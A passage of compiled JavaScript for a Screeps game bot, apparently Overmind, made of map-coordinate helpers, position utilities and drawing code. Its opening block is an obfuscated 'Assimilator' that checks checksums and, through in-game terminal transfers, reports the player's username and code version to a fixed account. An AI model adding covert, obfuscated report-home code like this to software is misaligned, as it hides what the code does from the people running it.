_0x19ef97=JSON[_0xe5ec('0x3c')](_[_0xe5ec('0x3d')](_0x498cc0[_0xe5ec('0x3a')][_0xe5ec('0x3e')](PHONE_HOME_HEADER)));const _0x1d6d0c=_0x19ef97['U']||'';const _0x228dbd=_0x19ef97['C']||'';const _0x50f77a=_0x19ef97['V']||'';if(_0x1d6d0c&&_0x1d6d0c!=''){this[_0xe5ec('0x11')][_0xe5ec('0x3f')][_0x1d6d0c]={'checksum':_0x228dbd,'version':_0x50f77a,'time':_0x498cc0[_0xe5ec('0x8')]};}}catch(_0x45243c){console[_0xe5ec('0x4')](_0xe5ec('0x40')+_0x498cc0[_0xe5ec('0x3a')]+_0xe5ec('0x41')+_0x45243c);}}}this[_0xe5ec('0x11')][_0xe5ec('0x3f')][MUON$1]={'checksum':this[_0xe5ec('0x19')](),'version':__VERSION__,'time':Game[_0xe5ec('0x8')]};}[_0xe5ec('0x42')](_0x375211,_0x4d0762,_0x51477a){if(UNTRUSTED_USERS[_0xe5ec('0x3b')](_0x375211)){return null;}if(!this[_0xe5ec('0x11')][_0xe5ec('0x36')][_0x4d0762]&&!TRUSTED_USERS[_0xe5ec('0x3b')](_0x375211)){return null;}const _0x75a56a=sha256('U'+_0x375211+'C'+_0x4d0762+'T'+_0x51477a)[_0xe5ec('0x1d')]((_0x2375d7,_0x1e4a2f)=>0x2*_0x2375d7+_0x1e4a2f);return '0x'+_0x75a56a[_0xe5ec('0x9')](0x10);}[_0xe5ec('0x43')](){const _0x41733f={};for(const _0x53db79 in this[_0xe5ec('0x11')][_0xe5ec('0x3f')]){const _0xfd58de=this[_0xe5ec('0x11')][_0xe5ec('0x3f')][_0x53db79][_0xe5ec('0x44')];const _0x17736f=ASSIMILATE_FREQUENCY*Math[_0xe5ec('0x2a')](Game[_0xe5ec('0x8')]/ASSIMILATE_FREQUENCY);_0x41733f[_0x53db79]=this[_0xe5ec('0x42')](_0x53db79,_0xfd58de,_0x17736f);}Segmenter[_0xe5ec('0x32')](ASSIMILATOR_SEGMENT,_0xe5ec('0x24'),_0x41733f);}[_0xe5ec('0x45')](){const _0x2924ab=Segmenter[_0xe5ec('0x46')]();if(_0x2924ab){const _0x22865b=_[_0xe5ec('0x47')](_[_0xe5ec('0x48')](_0x2924ab[_0xe5ec('0x49')],0x1));if(_0x22865b){const _0x258c4a=_[_0xe5ec('0x47')](_[_0xe5ec('0x48')](Overmind[_0xe5ec('0x4a')][_0xe5ec('0x4b')],0x1));if(_0x258c4a){const _0xae5593={'U':MY_USERNAME,'C':this[_0xe5ec('0x19')](),'V':__VERSION__};const _0x198af2=PHONE_HOME_HEADER+JSON[_0xe5ec('0x1b')](_0xae5593);_0x258c4a[_0xe5ec('0x4c')](RESOURCE_ENERGY,TERMINAL_MIN_SEND,_0x22865b,_0x198af2);}}}}[_0xe5ec('0x4d')](){switch(Game[_0xe5ec('0x8')]%ASSIMILATE_FREQUENCY){case T-0x8:this[_0xe5ec('0x35')]();break;case T-0x7:Segmenter[_0xe5ec('0x4e')](ASSIMILATOR_SEGMENT);break;case T-0x6:const _0x1990e2=_[_0xe5ec('0x4f')](Overmind[_0xe5ec('0x4a')][_0xe5ec('0x50')],_0x10e933=>_0x10e933[_0xe5ec('0x51')][_0xe5ec('0x52')]);Segmenter[_0xe5ec('0x32')](ASSIMILATOR_SEGMENT,_0xe5ec('0x49'),_0x1990e2);Segmenter[_0xe5ec('0x53')](ASSIMILATOR_SEGMENT);break;case T-0x5:break;case T-0x4:this[_0xe5ec('0x37')]();break;case T-0x3:Segmenter[_0xe5ec('0x4e')](ASSIMILATOR_SEGMENT);break;case T-0x2:Segmenter[_0xe5ec('0x4e')](ASSIMILATOR_SEGMENT);this[_0xe5ec('0x43')]();this[_0xe5ec('0x30')]();break;case T-0x1:this[_0xe5ec('0x26')]();break;case 0x0:this[_0xe5ec('0x29')]();break;default:break;}}[_0xe5ec('0x54')](){switch(Game[_0xe5ec('0x8')]%ASSIMILATE_FREQUENCY){case T-0x6:Segmenter[_0xe5ec('0x55')](MUON$1,ASSIMILATOR_SEGMENT);break;case T-0x5:this[_0xe5ec('0x45')]();break;case T-0x4:break;case T-0x3:break;case T-0x2:Segmenter[_0xe5ec('0x55')](MUON$1,ASSIMILATOR_SEGMENT);break;case T-0x1:this[_0xe5ec('0x26')]();this[_0xe5ec('0x33')]();break;case 0x0:this[_0xe5ec('0x29')]();break;default:break;}}[_0xe5ec('0x56')](){if(MY_USERNAME==MUON$1){this[_0xe5ec('0x4d')]();}else{this[_0xe5ec('0x54')]();}}}

global.Assimilator = new _Assimilator();

"use strict";
global.__VERSION__ = '0.5.2';
global.deref = function (ref) {
    return Game.getObjectById(ref) || Game.flags[ref] || Game.creeps[ref] || Game.spawns[ref] || null;
};
global.derefRoomPosition = function (protoPos) {
    return new RoomPosition(protoPos.x, protoPos.y, protoPos.roomName);
};
// // Assign values to the memory key aliases declared in memory.d.ts
// global._TICK = 'T';
// global._EXPIRATION = 'X';
// global._COLONY = 'C';
// global._OVERLORD = 'O';
// global._DISTANCE = 'D';
// global._RM_AVOID = 'a';
// global._RM_SOURCE = 's';
// global._RM_CONTROLLER = 'c';
// global._RM_MINERAL = 'm';
// global._RM_SKLAIRS = 'k';
//
// global._RM_IMPORTANTSTRUCTURES = 'i';
// global._RM_IS_TOWERS = 't';
// global._RM_IS_SPAWNS = 'sp';
// global._RM_IS_STORAGE = 's';
// global._RM_IS_TERMINAL = 'e';
// global._RM_IS_WALLS = 'w';
// global._RM_IS_RAMPARTS = 'r';
//
// global._RM_EXPANSIONDATA = 'e';
// global._RM_INVASIONDATA = 'v';
// global._RM_HARVEST = 'h';
// global._RM_CASUALTIES = 'd';
// global._RM_SAFETY = 'f';
// global._RM_PREVPOSITIONS = 'p';
// global._RM_CREEPSINROOM = 'cr';
//
// global._AMOUNT = 'a';
// global._AVG10K = 'D';
// global._AVG100K = 'H';
// global._AVG1M = 'M';
//
// global._CTRL_LEVEL = 'l';
// global._CTRL_OWNER = 'o';
// global._CTRL_RESERVATION = 'r';
// global._CTRL_RES_USERNAME = 'u';
// global._CTRL_RES_TICKSTOEND = 't';
// global._CTRL_SAFEMODE = 's';
// global._CTRL_SAFEMODE_AVAILABLE = 'sa';
// global._CTRL_SAFEMODE_COOLDOWN = 'sc';
// global._CTRL_PROGRESS = 'p';
// global._CTRL_PROGRESSTOTAL = 'pt';
//
// global._MNRL_MINERALTYPE = 't';
// global._MNRL_DENSITY = 'd';

"use strict";
// Creep properties ====================================================================================================
// Boosting logic ------------------------------------------------------------------------------------------------------
Object.defineProperty(Creep.prototype, 'boosts', {
    get() {
        if (!this._boosts) {
            this._boosts = _.compact(_.unique(_.map(this.body, bodyPart => bodyPart.boost)));
        }
        return this._boosts;
        // return _.compact(_.unique(_.map(this.body as BodyPartDefinition[],
        //                              bodyPart => bodyPart.boost))) as _ResourceConstantSansEnergy[];
    },
    configurable: true,
});
Object.defineProperty(Creep.prototype, 'boostCounts', {
    get() {
        if (!this._boostCounts) {
            this._boostCounts = _.countBy(this.body, bodyPart => bodyPart.boost);
        }
        return this._boostCounts;
    },
    configurable: true,
});
Object.defineProperty(Creep.prototype, 'inRampart', {
    get() {
        return !!this.pos.lookForStructure(STRUCTURE_RAMPART); // this assumes hostile creeps can't stand in my ramparts
    },
    configurable: true,
});

"use strict";
// RoomObject prototypes
Object.defineProperty(RoomObject.prototype, 'ref', {
    get: function () {
        return this.id || this.name || '';
    },
    configurable: true,
});
Object.defineProperty(RoomObject.prototype, 'targetedBy', {
    get: function () {
        return Overmind.cache.targets[this.ref] || [];
    },
    configurable: true,
});
RoomObject.prototype.serialize = function () {
    const pos = {
        x: this.pos.x,
        y: this.pos.y,
        roomName: this.pos.roomName
    };
    return {
        pos: pos,
        ref: this.ref
    };
};

const ROOMTYPE_SOURCEKEEPER = 'SK';
const ROOMTYPE_CORE = 'CORE';
const ROOMTYPE_CONTROLLER = 'CTRL';
const ROOMTYPE_ALLEY = 'ALLEY';
/**
 * Cartographer: provides helper methods related to Game.map. A few of these methods have been modified from BonzAI
 * codebase, although I have introduced new methods of my own over time as well.
 */
let Cartographer = class Cartographer {
    /**
     * Lists all rooms up to a given distance away, including roomName
     */
    static findRoomsInRange(roomName, depth) {
        return _.flatten(_.values(this.recursiveRoomSearch(roomName, depth)));
    }
    /**
     * Lists all rooms up at a given distance away, including roomName
     */
    static findRoomsAtRange(roomName, depth) {
        return this.recursiveRoomSearch(roomName, depth)[depth];
    }
    /**
     * Recursively enumerate all rooms from a root node using depth first search to a maximum depth
     */
    static recursiveRoomSearch(roomName, maxDepth) {
        const visitedRooms = this._recursiveRoomSearch(roomName, 0, maxDepth, {});
        const roomDepths = {};
        for (const room in visitedRooms) {
            const depth = visitedRooms[room];
            if (!roomDepths[depth]) {
                roomDepths[depth] = [];
            }
            roomDepths[depth].push(room);
        }
        return roomDepths;
    }
    /**
     * The recursive part of recursiveRoomSearch. Yields inverted results mapping roomName to depth.
     */
    static _recursiveRoomSearch(roomName, depth, maxDepth, visited) {
        if (visited[roomName] == undefined) {
            visited[roomName] = depth;
        }
        else {
            visited[roomName] = Math.min(depth, visited[roomName]);
        }
        const neighbors = _.values(Game.map.describeExits(roomName));
        if (depth < maxDepth) {
            for (const neighbor of neighbors) {
                // Visit the neighbor if not already done or if this would be a more direct route
                if (visited[neighbor] == undefined || depth + 1 < visited[neighbor]) {
                    this._recursiveRoomSearch(neighbor, depth + 1, maxDepth, visited);
                }
            }
        }
        return visited;
    }
    /**
     * Get the type of the room
     */
    static roomType(roomName) {
        const coords = this.getRoomCoordinates(roomName);
        if (coords.x % 10 === 0 || coords.y % 10 === 0) {
            return ROOMTYPE_ALLEY;
        }
        else if (coords.x % 5 === 0 && coords.y % 5 === 0) {
            return ROOMTYPE_CORE;
        }
        else if (coords.x % 10 <= 6 && coords.x % 10 >= 4 && coords.y % 10 <= 6 && coords.y % 10 >= 4) {
            return ROOMTYPE_SOURCEKEEPER;
        }
        else {
            return ROOMTYPE_CONTROLLER;
        }
    }
    /**
     * Get the name of a room offset from the anchor room
     */
    static findRelativeRoomName(roomName, xDelta, yDelta) {
        const coords = this.getRoomCoordinates(roomName);
        let xDir = coords.xDir;
        if (xDir === 'W') {
            xDelta = -xDelta;
        }
        let yDir = coords.yDir;
        if (yDir === 'N') {
            yDelta = -yDelta;
        }
        let x = coords.x + xDelta;
        let y = coords.y + yDelta;
        if (x < 0) {
            x = Math.abs(x) - 1;
            xDir = this.oppositeDir(xDir);
        }
        if (y < 0) {
            // noinspection JSSuspiciousNameCombination
            y = Math.abs(y) - 1;
            yDir = this.oppositeDir(yDir);
        }
        return xDir + x + yDir + y;
    }
    /**
     * Find the relative x and y offsets of two rooms
     */
    static findRoomCoordDeltas(origin, otherRoom) {
        const originCoords = this.getRoomCoordinates(origin);
        const otherCoords = this.getRoomCoordinates(otherRoom);
        let xDelta = otherCoords.x - originCoords.x;
        if (originCoords.xDir !== otherCoords.xDir) {
            xDelta = otherCoords.x + originCoords.x + 1;
        }
        let yDelta = otherCoords.y - originCoords.y;
        if (originCoords.yDir !== otherCoords.yDir) {
            yDelta = otherCoords.y + originCoords.y + 1;
        }
        // normalize direction
        if (originCoords.xDir === 'W') {
            xDelta = -xDelta;
        }
        if (originCoords.yDir === 'N') {
            yDelta = -yDelta;
        }
        return { x: xDelta, y: yDelta };
    }
    /**
     * Returns the direction (not magnitude) of a room from an origin room
     */
    static findRelativeRoomDir(origin, otherRoom) {
        const coordDeltas = this.findRoomCoordDeltas(origin, otherRoom);
        // noinspection JSSuspiciousNameCombination
        if (Math.abs(coordDeltas.x) == Math.abs(coordDeltas.y)) {
            if (coordDeltas.x > 0) {
                if (coordDeltas.y > 0) {
                    return 2;
                }
                else {
                    return 4;
                }
            }
            else if (coordDeltas.x < 0) {
                if (coordDeltas.y > 0) {
                    return 8;
                }
                else {
                    return 6;
                }
            }
            else {
                return 0;
            }
        }
        else {
            // noinspection JSSuspiciousNameCombination
            if (Math.abs(coordDeltas.x) > Math.abs(coordDeltas.y)) {
                if (coordDeltas.x > 0) {
                    return 3;
                }
                else {
                    return 7;
                }
            }
            else {
                if (coordDeltas.y > 0) {
                    return 1;
                }
                else {
                    return 5;
                }
            }
        }
    }
    /**
     * Return the opposite direction, e.g. "W" => "E"
     */
    static oppositeDir(dir) {
        switch (dir) {
            case 'W':
                return 'E';
            case 'E':
                return 'W';
            case 'N':
                return 'S';
            case 'S':
                return 'N';
            default:
                return 'error';
        }
    }
    /**
     * Get the coordinates from a room name
     */
    static getRoomCoordinates(roomName) {
        const coordinateRegex = /(E|W)(\d+)(N|S)(\d+)/g;
        const match = coordinateRegex.exec(roomName);
        const xDir = match[1];
        const x = match[2];
        const yDir = match[3];
        const y = match[4];
        return {
            x: Number(x),
            y: Number(y),
            xDir: xDir,
            yDir: yDir,
        };
    }
};
Cartographer = __decorate([
    profile
], Cartographer);

Object.defineProperty(RoomPosition.prototype, 'print', {
    get() {
        return '<a href="#!/room/' + Game.shard.name + '/' + this.roomName + '">[' + this.roomName + ', ' + this.x +
            ', ' + this.y + ']</a>';
    },
    configurable: true,
});
Object.defineProperty(RoomPosition.prototype, 'printPlain', {
    get() {
        return `[${this.roomName}, ${this.x}, ${this.y}]`;
    },
    configurable: true,
});
Object.defineProperty(RoomPosition.prototype, 'room', {
    get: function () {
        return Game.rooms[this.roomName];
    },
    configurable: true,
});
Object.defineProperty(RoomPosition.prototype, 'name', {
    get: function () {
        return this.roomName + ':' + this.x + ':' + this.y;
    },
    configurable: true,
});
Object.defineProperty(RoomPosition.prototype, 'coordName', {
    get: function () {
        return this.x + ':' + this.y;
    },
    configurable: true,
});
RoomPosition.prototype.lookForStructure = function (structureType) {
    return _.find(this.lookFor(LOOK_STRUCTURES), s => s.structureType === structureType);
};
RoomPosition.prototype.getOffsetPos = function (dx, dy) {
    let roomName = this.roomName;
    let x = this.x + dx;
    if (x < 0 || x > 49) {
        const dxRoom = Math.floor(x / 50);
        x = mod(x, 50);
        roomName = Cartographer.findRelativeRoomName(roomName, dxRoom, 0);
    }
    let y = this.y + dy;
    if (y < 0 || y > 49) {
        const dyRoom = Math.floor(y / 50);
        y = mod(y, 50);
        roomName = Cartographer.findRelativeRoomName(roomName, 0, dyRoom);
    }
    return new RoomPosition(x, y, roomName);
};
// RoomPosition.prototype.findInRange_fast = function<T extends HasPos>(objects: T[], range: number): T[] {
//  return _.filter(objects, o => this.inRangeToXY(o.pos.x, o.pos.y, range));
// }
Object.defineProperty(RoomPosition.prototype, 'isEdge', {
    get: function () {
        return this.x === 0 || this.x === 49 || this.y === 0 || this.y === 49;
    },
    configurable: true,
});
Object.defineProperty(RoomPosition.prototype, 'isVisible', {
    get: function () {
        return Game.rooms[this.roomName] != undefined;
    },
    configurable: true,
});
Object.defineProperty(RoomPosition.prototype, 'rangeToEdge', {
    get: function () {
        return _.min([this.x, 49 - this.x, this.y, 49 - this.y]);
    },
    configurable: true,
});
Object.defineProperty(RoomPosition.prototype, 'roomCoords', {
    get: function () {
        const parsed = /^[WE]([0-9]+)[NS]([0-9]+)$/.exec(this.roomName);
        let x = parseInt(parsed[1], 10);
        let y = parseInt(parsed[2], 10);
        if (this.roomName.includes('W'))
            x = -x;
        if (this.roomName.includes('N'))
            y = -y;
        return { x: x, y: y };
    },
    configurable: true,
});
Object.defineProperty(RoomPosition.prototype, 'neighbors', {
    get: function () {
        const adjPos = [];
        for (const dx of [-1, 0, 1]) {
            for (const dy of [-1, 0, 1]) {
                if (!(dx == 0 && dy == 0)) {
                    const x = this.x + dx;
                    const y = this.y + dy;
                    if (0 < x && x < 49 && 0 < y && y < 49) {
                        adjPos.push(new RoomPosition(x, y, this.roomName));
                    }
                }
            }
        }
        return adjPos;
    },
    configurable: true,
});
RoomPosition.prototype.inRangeToPos = function (pos, range) {
    return this.roomName === pos.roomName &&
        ((pos.x - this.x) < 0 ? (this.x - pos.x) : (pos.x - this.x)) <= range &&
        ((pos.y - this.y) < 0 ? (this.y - pos.y) : (pos.y - this.y)) <= range;
};
RoomPosition.prototype.inRangeToXY = function (x, y, range) {
    return ((x - this.x) < 0 ? (this.x - x) : (x - this.x)) <= range
        && ((y - this.y) < 0 ? (this.y - y) : (y - this.y)) <= range;
};
RoomPosition.prototype.getRangeToXY = function (x, y) {
    return Math.max((x - this.x) < 0 ? (this.x - x) : (x - this.x), ((y - this.y) < 0 ? (this.y - y) : (y - this.y)));
};
RoomPosition.prototype.getPositionsInRange = function (range, includeWalls = false, includeEdges = false) {
    const terrain = Game.map.getRoomTerrain(this.roomName);
    const adjPos = [];
    const [xmin, xmax] = includeEdges ? [0, 49] : [1, 48];
    const [ymin, ymax] = includeEdges ? [0, 49] : [1, 48];
    for (let dx = -1 * range; dx <= range; dx++) {
        for (let dy = -1 * range; dy <= range; dy++) {
            const x = this.x + dx;
            const y = this.y + dy;
            if (xmin <= x && x <= xmax && xmin <= y && y <= xmax) {
                if (includeWalls || terrain.get(x, y) !== TERRAIN_MASK_WALL) {
                    adjPos.push(new RoomPosition(x, y, this.roomName));
                }
            }
        }
    }
    return adjPos;
};
RoomPosition.prototype.getPositionsAtRange = function (range, includeWalls = false, includeEdges = false) {
    const terrain = Game.map.getRoomTerrain(this.roomName);
    const adjPos = [];
    const [xmin, xmax] = includeEdges ? [0, 49] : [1, 48];
    const [ymin, ymax] = includeEdges ? [0, 49] : [1, 48];
    for (let dx = -1 * range; dx <= range; dx++) {
        for (let dy = -1 * range; dy <= range; dy++) {
            if (Math.max(Math.abs(dx), Math.abs(dy)) < range) {
                continue;
            }
            const x = this.x + dx;
            const y = this.y + dy;
            if (xmin <= x && x <= xmax && xmin <= y && y <= xmax) {
                if (includeWalls || terrain.get(x, y) !== TERRAIN_MASK_WALL) {
                    adjPos.push(new RoomPosition(x, y, this.roomName));
                }
            }
        }
    }
    return adjPos;
};
RoomPosition.prototype.isWalkable = function (ignoreCreeps = false) {
    // Is terrain passable?
    if (Game.map.getRoomTerrain(this.roomName).get(this.x, this.y) == TERRAIN_MASK_WALL)
        return false;
    if (this.isVisible) {
        // Are there creeps?
        if (ignoreCreeps == false && this.lookFor(LOOK_CREEPS).length > 0)
            return false;
        // Are there structures?
        if (_.filter(this.lookFor(LOOK_STRUCTURES), (s) => !s.isWalkable).length > 0)
            return false;
    }
    return true;
};
RoomPosition.prototype.availableNeighbors = function (ignoreCreeps = false) {
    return _.filter(this.neighbors, pos => pos.isWalkable(ignoreCreeps));
};
RoomPosition.prototype.getPositionAtDirection = function (direction, range = 1) {
    let dx = 0;
    let dy = 0;
    switch (direction) {
        case 1:
            dy = -range;
            break;
        case 2:
            dy = -range;
            dx = range;
            break;
        case 3:
            dx = range;
            break;
        case 4:
            dx = range;
            dy = range;
            break;
        case 5:
            dy = range;
            break;
        case 6:
            dy = range;
            dx = -range;
            break;
        case 7:
            dx = -range;
            break;
        case 8:
            dx = -range;
            dy = -range;
            break;
    }
    return this.getOffsetPos(dx, dy);
};
// Object.defineProperty(RoomPosition.prototype, 'availableAdjacentSpots', {
//  get: function () {
//      if (this.isVisible) {
//          let spots: RoomPosition[] = [];
//          for (let spot of this.adjacentSpots) {
//              let structures = this.look;
//              if (Game.map.getTerrainAt(neighbor) != 'wall') {
//                  // Doesn't include constructed walls
//                  spots.push(neighbor);
//              }
//          }
//          return spots;
//      } else {
//          return this.adjacentSpots; // Assume there's nothing there
//      }
//  }
// });
// Get an estimate for the distance to another room position in a possibly different room
RoomPosition.prototype.getMultiRoomRangeTo = function (pos) {
    if (this.roomName == pos.roomName) {
        return this.getRangeTo(pos);
    }
    else {
        const from = this.roomCoords;
        const to = pos.roomCoords;
        const dx = Math.abs(50 * (to.x - from.x) + pos.x - this.x);
        const dy = Math.abs(50 * (to.y - from.y) + pos.y - this.y);
        return _.max([dx, dy]);
    }
};
RoomPosition.prototype.findClosestByLimitedRange = function (objects, rangeLimit, opts) {
    const objectsInRange = this.findInRange(objects, rangeLimit, opts);
    return this.findClosestByRange(objectsInRange, opts);
};
RoomPosition.prototype.findClosestByMultiRoomRange = function (objects) {
    return minBy(objects, (obj) => this.getMultiRoomRangeTo(obj.pos));
};
// This should only be used within a single room
RoomPosition.prototype.findClosestByRangeThenPath = function (objects) {
    const distances = _.map(objects, obj => this.getRangeTo(obj));
    const minDistance = _.min(distances);
    if (minDistance > 4) {
        return this.findClosestByRange(objects);
    }
    else {
        const closestObjects = _.filter(objects, obj => this.getRangeTo(obj) == minDistance);
        return this.findClosestByPath(closestObjects); // don't clutter up pathing.distance cached values
    }
};

"use strict";
RoomVisual.prototype.infoBox = function (info, x, y, opts = {}) {
    _.defaults(opts, {
        color: colors.infoBoxGood,
        textstyle: false,
        textsize: speechSize,
        textfont: 'verdana',
        opacity: 0.7,
    });
    let fontstring = '';
    if (opts.textstyle) {
        fontstring = opts.textstyle + ' ';
    }
    fontstring += opts.textsize + ' ' + opts.textfont;
    let pointer = [
        [.9, -0.25],
        [.9, 0.25],
        [0.3, 0.0],
    ];
    pointer = relPoly(x, y, pointer);
    pointer.push(pointer[0]);
    // Draw arrow
    this.poly(pointer, {
        fill: undefined,
        stroke: opts.color,
        opacity: opts.opacity,
        strokeWidth: 0.0
    });
    // // Draw box
    // this.rect(x + 0.9, y - 0.8 * opts.textsize,
    //  0.55 * opts.textsize * _.max(_.map(info, line => line.length)), info.length * opts.textsize,
    //  {
    //      fill   : undefined,
    //      opacity: opts.opacity
    //  });
    // Draw vertical bar
    const x0 = x + 0.9;
    const y0 = y - 0.8 * opts.textsize;
    this.line(x0, y0, x0, y0 + info.length * opts.textsize, {
        color: opts.color,
    });
    // Draw text
    let dy = 0;
    for (const line of info) {
        this.text(line, x + 1, y + dy, {
            color: opts.color,
            // backgroundColor  : opts.background,
            backgroundPadding: 0.1,
            opacity: opts.opacity,
            font: fontstring,
            align: 'left',
        });
        dy += opts.textsize;
    }
    return this;
};
RoomVisual.prototype.multitext = function (textLines, x, y, opts = {}) {
    _.defaults(opts, {
        color: colors.infoBoxGood,
        textstyle: false,
        textsize: speechSize,
        textfont: 'verdana',
        opacity: 0.7,
    });
    let fontstring = '';
    if (opts.textstyle) {
        fontstring = opts.textstyle + ' ';
    }
    fontstring += opts.textsize + ' ' + opts.textfont;
    // // Draw vertical bar
    // let x0 = x + 0.9;
    // let y0 = y - 0.8 * opts.textsize;
    // this.line(x0, y0, x0, y0 + textLines.length * opts.textsize, {
    //  color: opts.color,
    // });
    // Draw text
    let dy = 0;
    for (const line of textLines) {
        this.text(line, x, y + dy, {
            color: opts.color,
            // backgroundColor  : opts.background,
            backgroundPadding: 0.1,
            opacity: opts.opacity,
            font: fontstring,
            align: 'left',
        });
        dy += opts.textsize;
    }
    return this;
};
RoomVisual.prototype.box = function (x, y, w, h, style) {
    return this.line(x, y, x + w, y, style)
        .line(x + w, y, x + w, y + h, style)
        .line(x + w, y + h, x, y + h, style)
        .line(x, y + h, x, y, style);
};
// Taken from https://github.com/screepers/RoomVisual with slight modification: ========================================
const colors = {
    gray: '#555555',
    light: '#AAAAAA',
    road: '#666',
    energy: '#FFE87B',
    power: '#F53547',
    dark: '#181818',
    outline: '#8FBB93',
    speechText: '#000000',
    speechBackground: '#aebcc4',
    infoBoxGood: '#09ff00',
    infoBoxBad: '#ff2600'
};
const speechSize = 0.5;
const speechFont = 'Times New Roman';
RoomVisual.prototype.structure = function (x, y, type, opts = {}) {
    _.defaults(opts, { opacity: 0.5 });
    switch (type) {
        case STRUCTURE_EXTENSION:
            this.circle(x, y, {
                radius: 0.5,
                fill: colors.dark,
                stroke: colors.outline,
                strokeWidth: 0.05,
                opacity: opts.opacity
            });
            this.circle(x, y, {
                radius: 0.35,
                fill: colors.gray,
                opacity: opts.opacity
            });
            break;
        case STRUCTURE_SPAWN:
            this.circle(x, y, {
                radius: 0.65,
                fill: colors.dark,
                stroke: '#CCCCCC',
                strokeWidth: 0.10,
                opacity: opts.opacity
            });
            this.circle(x, y, {
                radius: 0.40,
                fill: colors.energy,
                opacity: opts.opacity
            });
            break;
        case STRUCTURE_POWER_SPAWN:
            this.circle(x, y, {
                radius: 0.65,
                fill: colors.dark,
                stroke: colors.power,
                strokeWidth: 0.10,
                opacity: opts.opacity
            });
            this.circle(x, y, {
                radius: 0.40,
                fill: colors.energy,
                opacity: opts.opacity
            });
            break;
        case STRUCTURE_LINK: {
            // let osize = 0.3;
            // let isize = 0.2;
            let outer = [
                [0.0, -0.5],
                [0.4, 0.0],
                [0.0, 0.5],
                [-0.4, 0.0]
            ];
            let inner = [
                [0.0, -0.3],
                [0.25, 0.0],
                [0.0, 0.3],
                [-0.25, 0.0]
            ];
            outer = relPoly(x, y, outer);
            inner = relPoly(x, y, inner);
            outer.push(outer[0]);
            inner.push(inner[0]);
            this.poly(outer, {
                fill: colors.dark,
                stroke: colors.outline,
                strokeWidth: 0.05,
                opacity: opts.opacity
            });
            this.poly(inner, {
                fill: colors.gray,
                stroke: false,
                opacity: opts.opacity
            });
            break;
        }
        case STRUCTURE_TERMINAL: {
            let outer = [
                [0.0, -0.8],
                [0.55, -0.55],
                [0.8, 0.0],
                [0.55, 0.55],
                [0.0, 0.8],
                [-0.55, 0.55],
                [-0.8, 0.0],
                [-0.55, -0.55],
            ];
            let inner = [
                [0.0, -0.65],
                [0.45, -0.45],
                [0.65, 0.0],
                [0.45, 0.45],
                [0.0, 0.65],
                [-0.45, 0.45],
                [-0.65, 0.0],
                [-0.45, -0.45],
            ];
            outer = relPoly(x, y, outer);
            inner = relPoly(x, y, inner);
            outer.push(outer[0]);
            inner.push(inner[0]);
            this.poly(outer, {
                fill: colors.dark,
                stroke: colors.outline,
                strokeWidth: 0.05,
                opacity: opts.opacity
            });
            this.poly(inner, {
                fill: colors.light,
                stroke: false,
                opacity: opts.opacity
            });
            this.rect(x - 0.45, y - 0.45, 0.9, 0.9, {
                fill: colors.gray,
                stroke: colors.dark,
                strokeWidth: 0.1,
                opacity: opts.opacity
            });
            break;
        }
        case STRUCTURE_LAB:
            this.circle(x, y - 0.025, {
                radius: 0.55,
                fill: colors.dark,
                stroke: colors.outline,
                strokeWidth: 0.05,
                opacity: opts.opacity
            });
            this.circle(x, y - 0.025, {
                radius: 0.40,
                fill: colors.gray,
                opacity: opts.opacity
            });
            this.rect(x - 0.45, y + 0.3, 0.9, 0.25, {
                fill: colors.dark,
                stroke: false,
                opacity: opts.opacity
            });
            {
                let box = [
                    [-0.45, 0.3],
                    [-0.45, 0.55],
                    [0.45, 0.55],
                    [0.45, 0.3],
                ];
                box = relPoly(x, y, box);
                this.poly(box, {
                    stroke: colors.outline,
                    strokeWidth: 0.05,
                    opacity: opts.opacity
                });
            }
            break;
        case STRUCTURE_TOWER:
            this.circle(x, y, {
                radius: 0.6,
                fill: colors.dark,
                stroke: colors.outline,
                strokeWidth: 0.05,
                opacity: opts.opacity
            });
            this.rect(x - 0.4, y - 0.3, 0.8, 0.6, {
                fill: colors.gray,
                opacity: opts.opacity
            });
            this.rect(x - 0.2, y - 0.9, 0.4, 0.5, {
                fill: colors.light,
                stroke: colors.dark,
                strokeWidth: 0.07,
                opacity: opts.opacity
            });
            break;
        case STRUCTURE_ROAD:
            this.circle(x, y, {
                radius: 0.175,
                fill: colors.road,
                stroke: false,
                opacity: opts.opacity
            });
            if (!this.roads)
                this.roads = [];
            this.roads.push([x, y]);
            break;
        case STRUCTURE_RAMPART:
            this.circle(x, y, {
                radius: 0.65,
                fill: '#434C43',
                stroke: '#5D735F',
                strokeWidth: 0.10,
                opacity: opts.opacity
            });
            break;
        case STRUCTURE_WALL:
            this.circle(x, y, {
                radius: 0.40,
                fill: colors.dark,
                stroke: colors.light,
                strokeWidth: 0.05,
                opacity: opts.opacity
            });
            break;
        case STRUCTURE_STORAGE:
            const storageOutline = relPoly(x, y, [
                [-0.45, -0.55],
                [0, -0.65],
                [0.45, -0.55],
                [0.55, 0],
                [0.45, 0.55],
                [0, 0.65],
                [-0.45, 0.55],
                [-0.55, 0],
                [-0.45, -0.55],
            ]);
            this.poly(storageOutline, {
                stroke: colors.outline,
                strokeWidth: 0.05,
                fill: colors.dark,
                opacity: opts.opacity
            });
            this.rect(x - 0.35, y - 0.45, 0.7, 0.9, {
                fill: colors.energy,
                opacity: opts.opacity,
            });
            break;
        case STRUCTURE_OBSERVER:
            this.circle(x, y, {
                fill: colors.dark,
                radius: 0.45,
                stroke: colors.outline,
                strokeWidth: 0.05,
                opacity: opts.opacity
            });
            this.circle(x + 0.225, y, {
                fill: colors.outline,
                radius: 0.20,
                opacity: opts.opacity
            });
            break;
        case STRUCTURE_NUKER:
            let outline = [
                [0, -1],
                [-0.47, 0.2],
                [-0.5, 0.5],
                [0.5, 0.5],
                [0.47, 0.2],
                [0, -1],
            ];
            outline = relPoly(x, y, outline);
            this.poly(outline, {
                stroke: colors.outline,
                strokeWidth: 0.05,
                fill: colors.dark,
                opacity: opts.opacity
            });
            let inline = [
                [0, -.80],
                [-0.40, 0.2],
                [0.40, 0.2],
                [0, -.80],
            ];
            inline = relPoly(x, y, inline);
            this.poly(inline, {
                stroke: colors.outline,
                strokeWidth: 0.01,
                fill: colors.gray,
                opacity: opts.opacity
            });
            break;
        case STRUCTURE_CONTAINER:
            this.rect(x - 0.225, y - 0.3, 0.45, 0.6, {
                fill: 'yellow',
                opacity: opts.opacity,
                stroke: colors.dark,
                strokeWidth: 0.10,
            });
            break;
        default:
            this.circle(x, y, {
                fill: colors.light,
                radius: 0.35,
                stroke: colors.dark,
                strokeWidth: 0.20,
                opacity: opts.opacity
            });
            break;
    }
    return this;
};
const dirs = [
    [],
    [0, -1],
    [1, -1],
    [1, 0],
    [1, 1],
    [0, 1],
    [-1, 1],
